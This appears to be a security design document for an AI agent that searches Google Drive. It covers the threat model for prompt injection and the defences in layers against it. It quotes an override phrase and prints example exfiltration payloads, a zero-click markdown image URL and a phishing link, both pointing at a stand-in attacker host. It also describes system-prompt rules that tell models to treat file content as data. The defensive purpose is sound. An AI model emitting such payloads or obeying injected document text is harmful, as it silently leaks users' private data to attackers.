<!-- Copyright (c) 2026 Benjamin Lau -->
<!-- SPDX-License-Identifier: MIT -->

# Prompt injection & exfiltration

> Part of the [project documentation](./README.md). Operating rules live in
> [`AGENTS.md`](../AGENTS.md).

Every document the agent reads is untrusted: a file shared into a connected
Drive, an email attachment saved there, or a collaboratively-edited doc can carry
text that targets the agent ("ignore your instructions and …"). This is prompt
injection, and it is unavoidable for a tool whose whole job is to read arbitrary
files.

## Threat model: read-only tools are not enough

The agent's tools are all read-only (`search_drive`, `open_file`, `review_file`,
`list_folder`), so an injection cannot make the agent *write*, delete, or call an
external side-effecting API. That bounds the server-side blast radius — but it
does **not** make the system safe, because the highest-value injection outcome
does not go through a tool at all. It goes through the **answer rendered in the
user's browser**.

A single run reads *many* documents (e.g. "synthesize my career"). If one of them
is attacker-controlled, it can try to make the synthesized answer carry data from
the *other* documents out to the attacker. The two browser-side channels:

- **Zero-click image exfiltration** — `![](https://attacker/x?d=<secret>)`. If the
  renderer emits an `<img>`, the browser auto-loads it and the attacker's server
  receives the query string. No click required. This is the dangerous one.
- **Phishing links** — `[click here](https://attacker/…)`. Requires a user click,
  so lower severity, but still worth constraining.

So "the worst case is just a bad answer plus some token burn" is wrong: without
the mitigations below, the worst case is **silent exfiltration of the user's own
private Drive data**. The cost/DoS axis genuinely *is* bounded — see the
diminishing-returns budget, cost seatbelt, context-window cap, and step backstop
in [retrieval-and-budget.md](./retrieval-and-budget.md) and
[llm-and-agent-loop.md](./llm-and-agent-loop.md).

## Defence in depth

No single layer is a guarantee; they stack so that a miss in one is caught by
another.

1. **Read-only tools + scope enforcement.** No write/side-effecting tool exists,
   and a `connectionId` outside the user's selected Drives is rejected as a
   recoverable observation before any Drive call (`handlers/open.ts`,
   `handlers/review.ts`).

2. **Close the browser exfiltration channels (the load-bearing layer).**
   - **Content-Security-Policy** (`next.config.ts`): `img-src 'self' data:` stops
     the zero-click image load; `connect-src 'self'` stops `fetch`/beacon exfil;
     `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`,
     `form-action 'self'` are standard hardening. `script-src`/`style-src`/
     `default-src` are intentionally left unset so Next.js's inline hydration
     works without a nonce — a strict, nonce-based `script-src` via middleware is
     the known follow-up.
   - **Hardened markdown sanitizer** (`components/markdown.tsx`): the answer is
     sanitized with a customised `rehype-sanitize` schema that **strips `<img>`
     entirely** (a Drive-search answer never needs to render one) and restricts
     link `href`s to `http`/`https`/`mailto`. Links already open with
     `rel="noreferrer noopener"`. This is defence-in-depth behind the CSP: even if
     the CSP were ever misconfigured, no image element reaches the DOM.

3. **Untrusted-content delimiting ("spotlighting").** Every path that feeds raw
   file content to a model wraps it with `wrapUntrustedContent`
   (`lib/agent/untrusted.ts`): a fenced block tagged with a **per-call random
   nonce** plus a one-line instruction naming the fence. Because a document cannot
   guess the nonce, text inside it that imitates the closing marker cannot end the
   block early and smuggle instructions back into the trusted channel. Applied in
   the main loop's `open_file` result (`handlers/open.ts`), the examiner
   (`examiner.ts`), and the summarizer (`summarizer.ts`).

4. **Prompt-level instruction guard.** Every content-ingesting system prompt —
   `basePrompt` (main agent, `prompts.ts`), `gradeSystemPrompt` (examiner),
   `SUMMARIZE_SYSTEM_PROMPT` (summarizer), and `rankSystemPrompt` (ranker) — tells
   the model to treat file content/notes as untrusted data, not instructions. This
   is the wording half of the delimiter above.

5. **Citation hallucination guard.** `resolveSources` (`lib/agent/answer.ts`) only
   resolves a synthesis `SOURCES:` citation to a file the agent actually
   *touched* this run, so an injected document cannot make a fabricated file
   surface as a "source". See [results-and-citations.md](./results-and-citations.md).

6. **SSRF guard for custom model endpoints.** Unrelated to file content, but part
   of the same posture: a user-supplied `openai-compatible` `baseUrl` is validated
   as public-HTTPS and pinned to public IPs at connect time (`lib/ssrf.ts`),
   closing the DNS-rebinding window.

## Known residuals

- **File metadata** (`file.name`) is still passed to the grader/summarizer as a
  labelled field, not fenced — a crafted filename is a low-bandwidth injection
  vector. The model is told content is untrusted, but the name is not nonce-fenced.
- **Layers 3–4 are probabilistic.** Delimiting and prompt instructions *reduce*
  but do not *eliminate* the chance a model obeys injected text. The guarantees
  live in layers 1–2 and 5 (no write tools; the browser can't load the image or
  beacon out; fabricated sources can't surface).
- **Strict `script-src` (documented follow-up, not yet implemented).** Today
  `script-src`/`style-src`/`default-src` are left unset so Next.js's inline
  hydration scripts run without a nonce. The rendered-markdown XSS surface is
  already covered by the sanitizer (it drops `<script>` and event handlers), so a
  strict `script-src` is defence-in-depth against a *future* XSS bug, not a
  currently-open hole — which is why it is deferred. To land it later:
  - Move the CSP out of `next.config.ts` into a `middleware.ts` that mints a
    per-request base64 nonce (`crypto.randomUUID()`), sets the CSP on both the
    forwarded request headers (so Next can read the nonce) and the response.
  - Emit `script-src 'self' 'nonce-<n>' 'strict-dynamic'`; Next auto-stamps its
    own injected scripts with the nonce, and `'strict-dynamic'` lets the chunks
    they load run without noncing each one. Any *own* inline script reads the
    nonce via `(await headers()).get('x-nonce')`.
  - Keep `style-src 'self' 'unsafe-inline'` — style nonces are poorly supported,
    CSS injection is low-risk, and the UI is plain CSS (no CSS-in-JS), so the only
    inline-style source is Next itself.
  - Gate the strict policy to production; dev HMR/Fast Refresh needs
    `'unsafe-eval'`.
  - Cost is low here: a per-request nonce forces dynamic rendering, but every
    route is already `ƒ` (dynamic), so no static-caching is lost.
